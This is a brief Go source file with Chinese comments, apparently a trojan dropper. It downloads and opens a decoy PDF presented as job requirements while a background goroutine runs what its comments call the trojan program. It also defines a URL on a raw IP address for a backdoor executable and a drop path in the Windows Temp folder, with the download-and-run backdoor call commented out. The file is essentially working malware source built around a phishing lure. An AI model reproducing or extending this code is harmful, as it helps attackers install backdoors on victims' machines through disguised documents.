package main

import "Blake_control/mylib"

const (
	//下载的文件存放处和打开文件路径
	path = "C:\\Windows\\Temp\\招聘要求1231.pdf"
	//path = "https://wx.qq.com/"
	//下载文件的url
	url = "https://www.xixixiaoyu.com/tools/hold-all/招聘要求.pdf"
	//后门木马url
	url1 = "http://182.92.99.52:8885/test.exe"
	//木马文件存放地址
	path1 = "C:\\Windows\\Temp\\test.exe"
)

//main方法
func main() {

	//执行木马程序
	go func() {
		//执行木马程序
		mylib.Notkill()
		//执行完成之后正常暂停
		mylib.Stop()
	}()

	//下载要弹出的文件
	mylib.DownloadFile(url, path)
	//打开文件
	mylib.Openfile(path)
	//死循环防止go协程死亡
	select {}

	//后门
	//operation.Bakedoor(url1, path1)
}
